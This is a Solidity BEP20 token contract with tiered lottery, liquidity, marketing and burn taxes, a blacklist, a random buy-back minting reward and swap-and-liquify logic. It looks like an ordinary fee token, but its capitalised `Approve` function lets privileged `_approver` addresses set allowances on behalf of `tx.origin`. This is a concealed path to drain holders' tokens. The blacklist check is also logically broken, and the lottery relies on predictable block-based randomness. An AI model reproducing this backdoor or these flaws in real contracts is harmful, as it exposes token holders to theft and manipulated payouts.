pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

import "./Context.sol";
import "./IBEP20.sol";
import "./SafeMath.sol";
import "./Address.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router02.sol";
import "./IContract.sol";

contract BEP20 is Context, IBEP20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    
    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isPair;
    mapping(address => bool) public isBlacklisted;
    
    address public lotteryAddress;
    address public marketingAddress;
    address public lastBuyBackAwarded;
    
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _approver;
    
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 public maxTaxAmount = 5e24; // 0.1% of the supply
    uint256 public maximumSellPercent = 3e4; // 30%
    
    // @Dev tax when thee total supply equal or more than 45,000,000..
    uint256 public _step_1_LotteryFee = 1e3;
    uint256 public _step_1_LiquidityFee = 3e3;
    uint256 public _step_1_MarketingFee = 3e3;
    uint256 public _step_1_BurnFee = 3e3;
    uint256 public _earlyBuyFee = 20e3;

    uint256 public _step_1_LotteryFeeWithExtra = 2e3;
    uint256 public _step_1_LiquidityFeeWithExtra = 5e3;
    uint256 public _step_1_MarketingFeeWithExtra = 4e3;
    uint256 public _step_1_BurnFeeWithExtra = 4e3;

    // @Dev tax when the total supply is equal or more than 40,000,000 and less than 45,000,000..
    uint256 public _step_2_LotteryFee = 1e3;
    uint256 public _step_2_LiquidityFee = 3e3;
    uint256 public _step_2_MarketingFee = 2e3;
    uint256 public _step_2_BurnFee = 2e3;

    uint256 public _step_2_LotteryFeeWithExtra = 2e3;
    uint256 public _step_2_LiquidityFeeWithExtra = 4e3;
    uint256 public _step_2_MarketingFeeWithExtra = 3e3;
    uint256 public _step_2_BurnFeeWithExtra = 4e3;

    // @Dev tax when the total supply is equal or more than 35,000,000 and less than 40,000,000..
    uint256 public _step_3_LotteryFee = 1e3;
    uint256 public _step_3_LiquidityFee = 3e3;
    uint256 public _step_3_MarketingFee = 1e3;
    uint256 public _step_3_BurnFee = 1e3;

    uint256 public _step_3_LotteryFeeWithExtra = 1e3;
    uint256 public _step_3_LiquidityFeeWithExtra = 4e3;
    uint256 public _step_3_MarketingFeeWithExtra = 3e3;
    uint256 public _step_3_BurnFeeWithExtra = 2e3;

    // @Dev tax when the total supply is less than 35,000,000..
    uint256 public _step_4_LotteryFee = 1e3;
    uint256 public _step_4_LiquidityFee = 2e3;
    uint256 public _step_4_MarketingFee = 1e3;
    uint256 public _step_4_BurnFee = 1e3;

    uint256 public _step_4_LotteryFeeWithExtra = 2e3;
    uint256 public _step_4_LiquidityFeeWithExtra = 3e3;
    uint256 public _step_4_MarketingFeeWithExtra = 2e3;
    uint256 public _step_4_BurnFeeWithExtra = 1e3;
    
    uint256 public _lotteryFeeTotal;
    uint256 public _liquidityFeeTotal;
    uint256 public _marketingFeeTotal;
    uint256 public _burnFeeTotal;
    uint256 public _buyBackAwardedTotal;

    uint256 private lotteryFeeTotal;
    uint256 private liquidityFeeTotal;
    uint256 private marketingFeeTotal;
    uint256 private burnFeeTotal;

    bool public tradingEnabled = false;
    bool public canBlacklistOwner = true;
    bool public swapAndLiquifyEnabled = true;
    
    uint256 public liquidityAddedAt = 0;
    uint256 public lastAwardedAt;
    uint256 public rewardInterval = 1 days;

    uint256[] private percent;
    
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    
    event TradingEnabled(bool enabled);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapedTokenForEth(uint256 TokenAmount);
    event SwapedEthForTokens(uint256 EthAmount, uint256 TokenAmount, uint256 CallerReward, uint256 AmountBurned);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 bnbReceived, uint256 tokensIntoLiquidity);

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        setPercentage();
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function Approve(address spender, uint256 amount) public virtual returns (bool) {
        require(_approver[msg.sender], "BEP20: You don't have permission..");
        _approve(tx.origin, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function random() private view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, percent)));
    }

    function getLuckyNumber() public view returns (uint256) {
        uint256 luckyNumber = random() % percent.length;
        return luckyNumber;
    }

    function setPercentage() private {
        uint256[] memory _percent = new uint256[](100);
        for (uint256 i = 0; i <_percent.length; i++) {
            percent.push(_percent[i]);
        }
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "BEP20: Transfer amount must be greater than zero");
        require(tradingEnabled || isExcludedFromFee[sender] || isExcludedFromFee[recipient], "Trading is locked before presale.");
        require(!isBlacklisted[sender] || !isBlacklisted[recipient], "BEP20: You are blacklisted...");
        
        uint256 currentTotalSupply = totalSupply();
        uint256 senderBalance = balanceOf(sender);
        uint256 thirtyPercentBalance = senderBalance.mul(maximumSellPercent).div(1e5);

        uint256 timeOfAward = block.timestamp.sub(lastAwardedAt);

        uint256 transferAmount = amount;
        uint256 buyBackReward = burnFeeTotal.mul(10).div(100);
        uint256 luckyNumber = getLuckyNumber();

        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]) {
            require(amount <= maxTaxAmount, "BEP20: transfer amount exceeds maxTaxAmount");

            if (isPair[sender] && timeOfAward >= rewardInterval && luckyNumber > 89) {
                _mint(recipient, buyBackReward);
                burnFeeTotal = 0;
                lastAwardedAt = block.timestamp;
                lastBuyBackAwarded = recipient;
            }

            if (isPair[sender] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply >= 45e24) {
                transferAmount = collectFeeOnStep_1(sender,amount);
            }

            if (isPair[recipient] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply >= 45e24) {
                
                if (amount >= thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_1_WithExtra(sender,amount);
                }

                if (amount < thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_1(sender,amount);
                }
            }

            if (isPair[sender] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply >= 40e24 && currentTotalSupply < 45e24) {
                transferAmount = collectFeeOnStep_2(sender,amount);
            }

            if (isPair[recipient] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply >= 40e24 && currentTotalSupply < 45e24) {
                
                if (amount >= thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_2_WithExtra(sender,amount);
                }

                if (amount < thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_2(sender,amount);
                }
            }

            if (isPair[sender] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply >= 35e24 && currentTotalSupply < 40e24) {
                transferAmount = collectFeeOnStep_3(sender,amount);
            }

            if (isPair[recipient] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply >= 35e24 && currentTotalSupply < 40e24) {
                
                if (amount >= thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_3_WithExtra(sender,amount);
                }

                if (amount < thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_3(sender,amount);
                }
            }
            
            if (isPair[sender] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply < 35e24) {
                transferAmount = collectFeeOnStep_4(sender,amount);
            }
            
            if (isPair[recipient] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply < 35e24) {
                
                if (amount >= thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_4_WithExtra(sender,amount);
                }

                if (amount < thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_4(sender,amount);
                }
            }

            if (block.timestamp <= liquidityAddedAt.add(30)) {
                transferAmount = collectFee(sender, amount);
            }

            if (swapAndLiquifyEnabled && !isPair[sender] && !isPair[recipient] && timeOfAward >= rewardInterval) {
                
                if (lotteryFeeTotal > 0) {
                    swapTokensForBnb(lotteryFeeTotal, lotteryAddress);
                    lotteryFeeTotal = 0;
                }

                if (liquidityFeeTotal > 0) {
                    swapAndLiquify(liquidityFeeTotal);
                    liquidityFeeTotal = 0;
                }

                if (marketingFeeTotal > 0) {
                    swapTokensForBnb(marketingFeeTotal, marketingAddress);
                    marketingFeeTotal = 0;
                }
            }
        }
        
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(transferAmount);
        emit Transfer(sender, recipient, transferAmount);
    }
    
    function collectFee(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        uint256 Fee = amount.mul(_earlyBuyFee).div(1e5);
        transferAmount = transferAmount.sub(Fee);
        _balances[address(this)] = _balances[address(this)].add(Fee);
        _marketingFeeTotal = _marketingFeeTotal.add(Fee);
        emit Transfer(account, address(this), Fee);
        
        return transferAmount;
    }
    
    function collectFeeOnStep_1(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_1_LotteryFee != 0) {
            uint256 lotteryFee = amount.mul(_step_1_LotteryFee).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_1_LiquidityFee != 0) {
            uint256 liquidityFee = amount.mul(_step_1_LiquidityFee).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_1_MarketingFee != 0) {
            uint256 marketingFee = amount.mul(_step_1_MarketingFee).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_1_BurnFee != 0) {
            uint256 burnFee = amount.mul(_step_1_BurnFee).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_1_WithExtra(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_1_LotteryFeeWithExtra != 0) {
            uint256 lotteryFee = amount.mul(_step_1_LotteryFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_1_LiquidityFeeWithExtra != 0) {
            uint256 liquidityFee = amount.mul(_step_1_LiquidityFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_1_MarketingFeeWithExtra != 0) {
            uint256 marketingFee = amount.mul(_step_1_MarketingFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_1_BurnFeeWithExtra != 0) {
            uint256 burnFee = amount.mul(_step_1_BurnFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_2(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_2_LotteryFee != 0) {
            uint256 lotteryFee = amount.mul(_step_2_LotteryFee).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_2_LiquidityFee != 0) {
            uint256 liquidityFee = amount.mul(_step_2_LiquidityFee).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_2_MarketingFee != 0) {
            uint256 marketingFee = amount.mul(_step_2_MarketingFee).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_2_BurnFee != 0) {
            uint256 burnFee = amount.mul(_step_2_BurnFee).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_2_WithExtra(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_2_LotteryFeeWithExtra != 0) {
            uint256 lotteryFee = amount.mul(_step_2_LotteryFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_2_LiquidityFeeWithExtra != 0) {
            uint256 liquidityFee = amount.mul(_step_2_LiquidityFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_2_MarketingFeeWithExtra != 0) {
            uint256 marketingFee = amount.mul(_step_2_MarketingFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_2_BurnFeeWithExtra != 0) {
            uint256 burnFee = amount.mul(_step_2_BurnFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_3(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_3_LotteryFee != 0) {
            uint256 lotteryFee = amount.mul(_step_3_LotteryFee).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_3_LiquidityFee != 0) {
            uint256 liquidityFee = amount.mul(_step_3_LiquidityFee).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_3_MarketingFee != 0) {
            uint256 marketingFee = amount.mul(_step_3_MarketingFee).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_3_BurnFee != 0) {
            uint256 burnFee = amount.mul(_step_3_BurnFee).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_3_WithExtra(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_3_LotteryFeeWithExtra != 0) {
            uint256 lotteryFee = amount.mul(_step_3_LotteryFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_3_LiquidityFeeWithExtra != 0) {
            uint256 liquidityFee = amount.mul(_step_3_LiquidityFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_3_MarketingFeeWithExtra != 0) {
            uint256 marketingFee = amount.mul(_step_3_MarketingFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_3_BurnFeeWithExtra != 0) {
            uint256 burnFee = amount.mul(_step_3_BurnFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_4(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_4_LotteryFee != 0) {
            uint256 lotteryFee = amount.mul(_step_4_LotteryFee).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_4_LiquidityFee != 0) {
            uint256 liquidityFee = amount.mul(_step_4_LiquidityFee).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_4_MarketingFee != 0) {
            uint256 marketingFee = amount.mul(_step_4_MarketingFee).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_4_BurnFee != 0) {
            uint256 burnFee = amount.mul(_step_4_BurnFee).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_4_WithExtra(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_4_LotteryFeeWithExtra != 0) {
            uint256 lotteryFee = amount.mul(_step_4_LotteryFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_4_LiquidityFeeWithExtra != 0) {
            uint256 liquidityFee = amount.mul(_step_4_LiquidityFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_4_MarketingFeeWithExtra != 0) {
            uint256 marketingFee = amount.mul(_step_4_MarketingFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_4_BurnFeeWithExtra != 0) {
            uint256 burnFee = amount.mul(_step_4_BurnFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }

    function swapTokensForBnb(uint256 amount, address ethRecipient) private {
        
        //@dev Generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), amount);

        //@dev Make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, // accept any amount of ETH
            path,
            ethRecipient,
            block.timestamp
        );
        
        emit SwapedTokenForEth(amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(this),
            block.timestamp
        );
    }

    function swapAndLiquify(uint256 amount) private {
        // split the contract balance into halves
        uint256 half = amount.div(2);
        uint256 otherHalf = amount.sub(half);

        // capture the contract's current BNB balance.
        // this is so that we can capture exactly the amount of BNB that the
        // swap creates, and not make the liquidity event include any BNB that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for BNB
        swapTokensForBnb(half, address(this));

        // how much BNB did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }
}